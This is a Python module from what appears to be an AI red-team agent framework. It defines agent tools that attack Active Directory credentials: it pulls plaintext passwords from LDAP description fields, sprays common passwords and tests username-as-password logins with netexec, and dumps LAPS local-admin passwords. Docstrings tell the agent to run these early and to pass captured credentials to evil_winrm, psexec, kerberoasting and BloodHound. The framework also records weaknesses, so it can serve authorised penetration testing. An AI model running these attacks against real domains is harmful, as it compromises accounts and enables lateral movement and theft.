"""Low-hanging fruit credential discovery tools.

This module provides tools for finding easy credential wins:
- Passwords in LDAP description fields
- Username=password combinations
- Password spraying with common passwords
- LAPS password retrieval
"""

import re
from typing import Any, ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset
from loguru import logger

from ares.core.models import Credential
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    AnyRedTeamState,
    add_credential_to_state,
    filter_users_file_remote,
    format_weakness_block,
    remote_file_exists,
    resolve_host_or_ip,
    resolve_password,
    run_tool,
    write_users_file_remote,
)


class CredentialDiscoveryTools(Toolset):
    """Tools for discovering credentials through low-hanging fruit attacks.

    These tools find easy wins that should be run FIRST before complex attacks:
    - Passwords in LDAP description fields
    - Username=password combinations
    - Password spraying with common passwords
    """

    state: AnyRedTeamState | None = None
    dispatcher: Any | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def set_dispatcher(self, dispatcher) -> None:
        self.dispatcher = dispatcher

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _run_user_enum_commands(
        self, target: str, username: str, password: str, domain: str
    ) -> list[tuple[str, str]]:
        from ares.tools.red.reconnaissance import NetworkEnumerationTools

        enum_tools = NetworkEnumerationTools()
        if self.state:
            enum_tools.set_state(self.state)
        return enum_tools._run_user_enum_commands(target, username, password, domain)

    def _extract_users_from_outputs(self, outputs: list[tuple[str, str]]) -> set[tuple[str, str]]:
        from ares.tools.red.reconnaissance import NetworkEnumerationTools

        return NetworkEnumerationTools()._extract_users_from_outputs(outputs)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _add_credential(
        self,
        username: str,
        password: str,
        domain: str,
        source: str,
        is_admin: bool = False,
    ) -> None:
        if not self.state or not username:
            return
        cred = Credential(
            username=username,
            password=password,
            domain=domain,
            source=source,
            is_admin=is_admin,
        )
        add_credential_to_state(self.state, cred, "recon", self.dispatcher)

    def _parse_netexec_credentials(self, result: str) -> list[tuple[str, str, str, bool]]:
        creds: list[tuple[str, str, str, bool]] = []
        if not result:
            return creds
        failure_markers = (
            "STATUS_LOGON_FAILURE",
            "STATUS_PASSWORD_EXPIRED",
            "STATUS_PASSWORD_MUST_CHANGE",
            "STATUS_ACCOUNT_LOCKED_OUT",
            "STATUS_ACCOUNT_DISABLED",
            "STATUS_ACCOUNT_RESTRICTION",
            "STATUS_NO_LOGON_SERVERS",
            "STATUS_ACCESS_DENIED",
            "STATUS_INVALID_LOGON_HOURS",
            "STATUS_INVALID_WORKSTATION",
            "NT_STATUS_",
            "LOGON FAILURE",
            "LOGON_FAILURE",
            "ACCESS_DENIED",
        )
        for line in result.splitlines():
            if "[+]" not in line and "Pwn3d!" not in line:
                continue
            line_upper = line.upper()
            if any(marker in line_upper for marker in failure_markers):
                continue
            if "(Guest)" in line:
                continue
            match = re.search(r"([A-Za-z0-9_.-]+)\\([^:\s]+):(\S+)", line)
            if not match:
                continue
            domain, username, password = match.groups()
            if "/" in username or "\\" in username or username.endswith(".txt"):
                continue
            if "/" in password or "\\" in password or password.endswith(".txt"):
                continue
            is_admin = "pwn3d!" in line.lower()
            creds.append((domain, username, password, is_admin))
        return creds

    def _extract_passwords_from_user_enum_output(self, output: str) -> list[tuple[str, str]]:  # noqa: PLR0912
        if not output:
            return []
        creds: list[tuple[str, str]] = []
        current_user = ""
        for line in output.splitlines():
            stripped = line.strip()
            if not stripped:
                continue

            user_match = re.search(r"user:\[([^\]]+)\]", stripped, re.IGNORECASE)
            if user_match:
                current_user = user_match.group(1).strip()

            account_match = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
            if account_match:
                current_user = account_match.group(1).strip()

            sam_match = re.search(r"samaccountname:\s*([A-Za-z0-9_.-]+)", stripped, re.IGNORECASE)
            if sam_match:
                current_user = sam_match.group(1).strip()

            if "password" not in stripped.lower():
                continue

            pass_match = re.search(r"Password\s*:\s*([^\s()]+)", stripped, re.IGNORECASE)
            if not pass_match:
                continue
            password = pass_match.group(1).strip().rstrip(".,;:!?()")

            username = ""
            account_inline = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
            if account_inline:
                username = account_inline.group(1).strip()
            elif current_user:
                username = current_user
            else:
                netexec_match = re.search(
                    r"\b([A-Za-z0-9_.-]+)\b\s+\d{4}-\d{2}-\d{2}.*Password\s*:\s*",
                    stripped,
                )
                if netexec_match:
                    username = netexec_match.group(1).strip()

            if not username:
                continue
            if "/" in username or "\\" in username or username.endswith(".txt"):
                continue
            if "/" in password or "\\" in password or password.endswith(".txt"):
                continue

            creds.append((username, password))
        return creds

    def _resolve_host_or_ip(self, host: str) -> str:
        return resolve_host_or_ip(self.state, host)

    def _extract_password_from_description(self, username: str, description: str) -> str | None:
        if not description:
            return None
        match = re.search(
            r"(?:password|pass|pwd)\s*[:=]\s*([^\s,;()]+)", description, re.IGNORECASE
        )
        if match:
            return match.group(1).rstrip(".,;:!?")
        if username:
            user_match = re.search(
                rf"{re.escape(username)}\s*[:/\-]\s*([^\s,;()]+)", description, re.IGNORECASE
            )
            if user_match:
                return user_match.group(1).rstrip(".,;:!?")
        return None

    def _iter_description_entries(self, raw_output: str) -> list[tuple[str, str]]:
        entries: list[tuple[str, str]] = []
        current_user = ""
        current_desc = ""
        for raw_line in raw_output.splitlines():
            stripped = raw_line.strip()
            if not stripped:
                if current_user and current_desc:
                    entries.append((current_user, current_desc))
                current_user = ""
                current_desc = ""
                continue
            lower = stripped.lower()
            if lower.startswith("samaccountname:"):
                current_user = stripped.split(":", 1)[1].strip()
            elif lower.startswith("description:"):
                current_desc = stripped.split(":", 1)[1].strip()
        if current_user and current_desc:
            entries.append((current_user, current_desc))
        return entries

    @dn.tool_method
    def ldap_search_descriptions(
        self,
        target: str,
        domain: str,
        username: str,
        password: str,
    ) -> str:
        """
        Search for passwords stored in user description fields (LOW HANGING FRUIT).

        Many environments have passwords stored in the description attribute of user
        accounts. This is a common misconfiguration that provides immediate access.

        **RUN THIS EARLY** - It's fast and often yields credentials like dave.lee:ExamplePass123!.

        Args:
            target: Domain controller IP address
            domain: Target domain (e.g., 'example.local')
            username: Username for LDAP authentication
            password: Password for authentication

        Returns:
            Users with non-empty descriptions (check for passwords!)

        Example:
            >>> ldap_search_descriptions("192.168.58.10", "example.local", "user", "pass")
        """
        # Validate required credentials
        if not username or not username.strip():
            return "[!] LDAP search requires a valid username. Cannot search without credentials."
        resolved_password = self._resolve_password(username, domain, password)
        if not resolved_password or not resolved_password.strip():
            return "[!] LDAP search requires a valid password. Cannot search without credentials."
        if resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."
        if self.state and hasattr(self.state, "add_domain"):
            self.state.add_domain(domain)

        base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

        cmd = [
            "ldapsearch",
            "-x",
            "-H",
            f"ldap://{target}",
            "-D",
            f"{username}@{domain}",
            "-w",
            resolved_password or "",
            "-b",
            base_dn,
            "(&(objectClass=user)(description=*))",
            "sAMAccountName",
            "description",
            "userPrincipalName",
        ]

        try:
            logger.info(f"[*] Searching LDAP descriptions for passwords in {domain}")
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120)
            raw_output = stdout + "\n" + (stderr or "")
            result = raw_output

            if "description:" in result.lower():
                logger.warning("[!] Found users with descriptions - CHECK FOR PASSWORDS!")
                result = (
                    "🚨 USERS WITH DESCRIPTIONS FOUND - CHECK FOR PASSWORDS!\n"
                    "\u2192 Common pattern: user 'dave.lee' has password 'ExamplePass123!' in description\n"
                    "\u2192 Test any found credentials immediately with domain_admin_checker\n\n"
                    + result
                )

            if self.state:
                for entry_user, entry_desc in self._iter_description_entries(raw_output):
                    password_value = self._extract_password_from_description(entry_user, entry_desc)
                    if password_value:
                        self._add_credential(
                            entry_user,
                            password_value,
                            domain,
                            "ldap_description",
                        )
                        details = {
                            "Affected Account": entry_user,
                            "Description": entry_desc,
                            "Password": password_value,
                        }
                        block = format_weakness_block(
                            "Credential Discovery - Password in User Description Field",
                            "Plaintext passwords stored in user description attribute",
                            details,
                            "Immediate authenticated access",
                            "LDAP enumeration",
                        )
                        self._add_weakness(block)

            return result

        except Exception as e:
            return f"LDAP search failed: {e}"

    @dn.tool_method
    def password_spray(  # noqa: PLR0912
        self,
        target: str,
        domain: str,
        password: str,
        users_file: str = "",
        delay_seconds: int = 0,
    ) -> str:
        """
        Test a single password against all domain users (password spraying).

        Password spraying tests one password against many users to avoid lockouts.
        Common passwords to try: 'Password1', 'Welcome1', 'Company123', season+year.

        **CRITICAL**: Check lockout policy first. Default is usually 5 attempts.

        If no users_file is provided, this tool will automatically enumerate users
        from the target first using null session authentication.

        Args:
            target: Domain controller IP address
            domain: Target domain
            password: Password to spray
            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)
            delay_seconds: Delay between attempts (default: 0)

        Returns:
            Successful authentications (look for valid credentials)

        Example:
            >>> password_spray("192.168.58.10", "child.example.local", "Password1")  # auto-enumerate
            >>> password_spray("192.168.58.10", "child.example.local", "Password1", "/tmp/users.txt")
        """
        try:
            if not users_file:
                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
                enumerated_file = self._enumerate_users_to_file(target)
                if not enumerated_file:
                    canonical_users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
                    # Check if users file exists locally
                    exists, _ = remote_file_exists(canonical_users_file, target_role=None)
                    if not exists:
                        return (
                            "[!] Failed to enumerate users and no users_file provided. "
                            "Try save_users_to_file first."
                        )
                    logger.info(f"[*] Using existing users file: {canonical_users_file}")
                    users_file = canonical_users_file
                else:
                    users_file = enumerated_file

            if self.state and self.state.credentials:
                exclude_users: set[str] = set()
                domain_key = domain.strip().lower()
                for cred in self.state.credentials:
                    if not cred.username:
                        continue
                    cred_domain = (cred.domain or "").strip().lower()
                    if domain_key and cred_domain and cred_domain != domain_key:
                        continue
                    exclude_users.add(cred.username.lower())
                if exclude_users:
                    # Filter out users who already have credentials
                    filtered_file, error = filter_users_file_remote(
                        users_file, exclude_users, target_role=None
                    )
                    if error == "all users already have credentials":
                        return "[!] Password spray skipped: all users already have credentials."
                    if error:
                        logger.warning(f"[!] Failed to filter users file: {error}")
                    elif filtered_file:
                        users_file = filtered_file

            cmd = [
                "netexec",
                "smb",
                target,
                "-u",
                users_file,
                "-p",
                password,
                "-d",
                domain,
                "--continue-on-success",
            ]

            if delay_seconds > 0:
                cmd.extend(["--jitter", str(delay_seconds)])

            logger.info(f"[*] Password spraying {domain} with password: {password}")
            # netexec is only installed on RECON pods - route there
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300, target_role="recon")

            result = stdout + "\n" + (stderr or "")
            creds = self._parse_netexec_credentials(result)
            matching_creds = [cred for cred in creds if cred[2] == password]

            if creds and not matching_creds:
                logger.warning(
                    "[!] Password spray parsed credentials, but none matched the sprayed password; "
                    "ignoring to avoid false positives."
                )

            if matching_creds:
                logger.warning("[!] PASSWORD SPRAY FOUND VALID CREDENTIALS!")
                result = (
                    "🚨 VALID CREDENTIALS FOUND!\n"
                    "\u2192 Look for [+] lines indicating successful auth\n"
                    "\u2192 'Pwn3d!' indicates ADMIN access\n"
                    "\u2192 Use found credentials for further recon\n\n" + result
                )
            elif "(Guest)" in result:
                filtered_lines = [line for line in result.splitlines() if "(Guest)" not in line]
                result = "\n".join(filtered_lines)
                result += "\n[!] Guest-only SMB access detected; ignore as valid credentials."

            if self.state and matching_creds:
                accounts = []
                for cred_domain, username, found_password, is_admin in matching_creds:
                    self._add_credential(
                        username,
                        found_password,
                        cred_domain,
                        "password_spray",
                        is_admin=is_admin,
                    )
                    accounts.append(f"{cred_domain}\\{username}")
                block = format_weakness_block(
                    "Credential Discovery - Password Spray Success",
                    "Weak password choice allows password spraying",
                    {
                        "Discovered Accounts": ", ".join(sorted(set(accounts))),
                        "Password": password,
                    },
                    "Enables credential stuffing and rapid access",
                    "Password spraying",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Password spray failed: {e}"

    def _enumerate_users_to_file(self, target: str) -> str | None:
        """Enumerate users from target and save to temp file. Returns file path or None."""
        try:
            username, password, domain = "", "", ""
            if self.state and self.state.credentials:
                cred = self.state.credentials[0]
                username, password, domain = cred.username, cred.password, cred.domain
                logger.info(f"[*] Using credential {domain}\\{username} for user recon")

            outputs = self._run_user_enum_commands(target, username, password, domain)
            user_tuples = self._extract_users_from_outputs(outputs)

            if not user_tuples:
                from ares.tools.red.reconnaissance import NetworkEnumerationTools

                helper = NetworkEnumerationTools()
                summary = helper._summarize_enum_outputs(outputs)
                if summary:
                    logger.warning(f"[!] No users enumerated from {target}. Status:\n{summary}")
                else:
                    logger.warning(f"[!] No users enumerated from {target}")
                return None

            # Extract just usernames for file (password spraying uses usernames only)
            usernames = sorted({u[0] for u in user_tuples})

            users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
            # Write users file locally for password spraying
            ok, error = write_users_file_remote(usernames, users_file, target_role=None)
            if not ok:
                logger.warning(f"[!] Failed to write users file on remote: {error}")
                return None
            logger.info(f"[+] Auto-enumerated {len(usernames)} users to {users_file}")
            return users_file

        except Exception as e:
            logger.error(f"Auto user recon failed: {e}")
            return None

    @dn.tool_method
    def username_as_password(
        self,
        target: str,
        domain: str,
        users_file: str = "",
    ) -> str:
        """
        Test if any user has their username as their password (LOW HANGING FRUIT).

        Many users set their password to match their username (e.g., user1:user1).
        This is fast, safe (one attempt per user), and often successful.

        **RUN THIS EARLY** - Zero lockout risk, high success rate in weak environments.

        If no users_file is provided, this tool will automatically enumerate users
        from the target first using null session authentication.

        Args:
            target: Domain controller IP address
            domain: Target domain
            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)

        Returns:
            Users with username=password combinations

        Example:
            >>> username_as_password("192.168.58.10", "child.example.local")  # auto-enumerate
            >>> username_as_password("192.168.58.10", "child.example.local", "/tmp/users.txt")
        """
        try:
            if not users_file:
                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
                enumerated_file = self._enumerate_users_to_file(target)
                if not enumerated_file:
                    canonical_users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
                    # Check if users file exists locally
                    exists, _ = remote_file_exists(canonical_users_file, target_role=None)
                    if not exists:
                        return (
                            "[!] Failed to enumerate users and no users_file provided. "
                            "Try save_users_to_file first."
                        )
                    logger.info(f"[*] Using existing users file: {canonical_users_file}")
                    users_file = canonical_users_file
                else:
                    users_file = enumerated_file

            cmd = [
                "netexec",
                "smb",
                target,
                "-u",
                users_file,
                "-p",
                users_file,
                "-d",
                domain,
                "--no-bruteforce",
                "--continue-on-success",
            ]

            logger.info(f"[*] Testing username=password combinations in {domain}")
            # netexec is only installed on RECON pods - route there
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300, target_role="recon")

            result = stdout + "\n" + (stderr or "")

            creds = self._parse_netexec_credentials(result)
            matching: list[tuple[str, str, str, bool]] = []
            for cred_domain, username, found_password, is_admin in creds:
                if found_password.lower() != username.lower():
                    continue
                matching.append((cred_domain, username, found_password, is_admin))

            if matching:
                accounts = sorted(
                    {f"{cred_domain}\\{username}" for cred_domain, username, _, _ in matching}
                )
                logger.warning(
                    f"[!] FOUND USER WITH USERNAME=PASSWORD! Accounts: {', '.join(accounts)}"
                )
                result = (
                    "🚨 USERNAME=PASSWORD FOUND!\n"
                    f"\u2192 Accounts: {', '.join(accounts)}\n"
                    "\u2192 Common examples: user1:user1, guest:guest\n"
                    "\u2192 Use found credentials for kerberoast, asrep_roast, bloodhound\n\n"
                    + result
                )
            elif creds:
                logger.warning(
                    "[!] username_as_password saw successful auth, but none matched username=password; "
                    "ignoring to avoid false positives."
                )
            if "(Guest)" in result:
                filtered_lines = [line for line in result.splitlines() if "(Guest)" not in line]
                result = "\n".join(filtered_lines)
                result += "\n[!] Guest-only SMB access detected; ignore as valid credentials."

            if self.state and matching:
                for cred_domain, username, found_password, is_admin in matching:
                    self._add_credential(
                        username,
                        found_password,
                        cred_domain,
                        "username_as_password",
                        is_admin=is_admin,
                    )
                block = format_weakness_block(
                    "Credential Discovery - Username=Password Combinations",
                    "Users with passwords matching their usernames",
                    {
                        "Discovered Accounts": ", ".join(sorted(set(accounts))),
                    },
                    "Immediate authenticated access",
                    "Username-as-password test",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Username-as-password test failed: {e}"

    @dn.tool_method
    def password_policy(
        self,
        target: str,
        domain: str,
        username: str,
        password: str,
    ) -> str:
        """
        Retrieve domain password policy settings.

        Use this to check complexity requirements, minimum password length,
        and lockout thresholds before password spraying.

        Args:
            target: Domain controller IP address
            domain: Target domain
            username: Username for authentication
            password: Password for authentication

        Returns:
            Password policy details from the domain controller

        Example:
            >>> password_policy("192.168.58.10", "example.local", "user", "pass")
        """
        cmd = [
            "netexec",
            "smb",
            target,
            "-u",
            username,
            "-p",
            password,
            "-d",
            domain,
            "--pass-pol",
        ]

        try:
            logger.info(f"[*] Querying password policy for {domain}")
            # netexec is only installed on RECON pods - route there
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120, target_role="recon")
            result = stdout + "\n" + (stderr or "")

            min_length = None
            lockout_threshold = None
            complexity_value = None

            min_match = re.search(
                r"(?:minimum|min)\s+password\s+length\s*:\s*(\d+)",
                result,
                re.IGNORECASE,
            )
            if min_match:
                min_length = int(min_match.group(1))

            lockout_match = re.search(
                r"lockout\s+threshold\s*:\s*(\d+)",
                result,
                re.IGNORECASE,
            )
            if lockout_match:
                lockout_threshold = int(lockout_match.group(1))

            complexity_match = re.search(
                r"(?:password\s+complexity|complexity)\s*:\s*([A-Za-z0-9_\-]+)",
                result,
                re.IGNORECASE,
            )
            if complexity_match:
                complexity_value = complexity_match.group(1).strip()

            is_weak = False
            if min_length is not None and min_length < 8:
                is_weak = True
            if complexity_value:
                complexity_lower = complexity_value.lower()
                if complexity_lower in {"disabled", "false", "no", "off", "0"}:
                    is_weak = True

            if self.state and is_weak:
                details: dict[str, str] = {}
                if min_length is not None:
                    details["Minimum Password Length"] = str(min_length)
                if lockout_threshold is not None:
                    details["Lockout Threshold"] = str(lockout_threshold)
                if complexity_value:
                    details["Complexity Requirements"] = complexity_value
                block = format_weakness_block(
                    "Credential Discovery - Weak Password Policy",
                    "Insufficient password complexity requirements",
                    details,
                    "Enables password spraying attacks",
                    "Password policy recon",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Password policy check failed: {e}"

    @dn.tool_method
    def laps_dump(
        self,
        target: str,
        domain: str,
        username: str,
        password: str,
    ) -> str:
        """
        Dump LAPS (Local Administrator Password Solution) passwords.

        LAPS stores randomized local admin passwords in AD. If you have read access
        to the ms-Mcs-AdmPwd attribute, you can retrieve local admin passwords.

        Use when you have elevated permissions or after ACL abuse grants read access.

        Args:
            target: Domain controller IP address
            domain: Target domain
            username: Username for authentication
            password: Password for authentication

        Returns:
            LAPS passwords for computers where you have read access

        Example:
            >>> laps_dump("192.168.58.10", "example.local", "user", "pass")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "netexec",
            "ldap",
            target,
            "-u",
            username,
            "-p",
            resolved_password or "",
            "-d",
            domain,
            "-M",
            "laps",
        ]

        try:
            logger.info(f"[*] Dumping LAPS passwords from {domain}")
            # netexec is only installed on RECON pods - route there
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120, target_role="recon")

            result = stdout + "\n" + (stderr or "")

            if "password" in result.lower() or "laps" in result.lower():
                logger.info("[+] LAPS passwords retrieved!")
                result = (
                    "📋 LAPS PASSWORDS RETRIEVED\n"
                    "\u2192 These are local Administrator passwords for specific computers\n"
                    "\u2192 Use with evil_winrm or psexec against the target computer\n\n" + result
                )

            return result

        except Exception as e:
            return f"LAPS dump failed: {e}"


__all__ = ["CredentialDiscoveryTools"]
